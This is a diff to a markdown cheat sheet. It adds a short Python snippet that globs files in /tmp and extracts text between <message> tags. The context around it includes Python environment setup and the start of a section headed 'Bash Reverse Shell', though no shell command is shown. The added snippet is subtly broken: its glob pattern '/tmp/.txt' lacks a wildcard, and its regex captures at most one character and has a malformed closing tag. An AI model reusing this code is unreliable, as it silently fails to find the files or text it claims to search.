@@ -63,6 +63,16 @@ myenv\Scripts\activate                      # Activate
 python --version  # Verify it's 3.11.x      # Check version
 python.exe -m pip install --upgrade pip     # Upgrade pip
 ```
+### Read all files in folder and search for regex:
+```
+import glob, re
+for msg in glob.glob('/tmp/.txt'):
+     filer = open((msg),'r')
+     data = filer.read()
+     message = re.findall(r'<message>(.?)>/message>', data,re.DOTALL)
+     print("File %s contains %s" % (str(msg),message))
+     filer.close()
+```
 ### Bash Reverse Shell
 ```
 #!/bin/bash
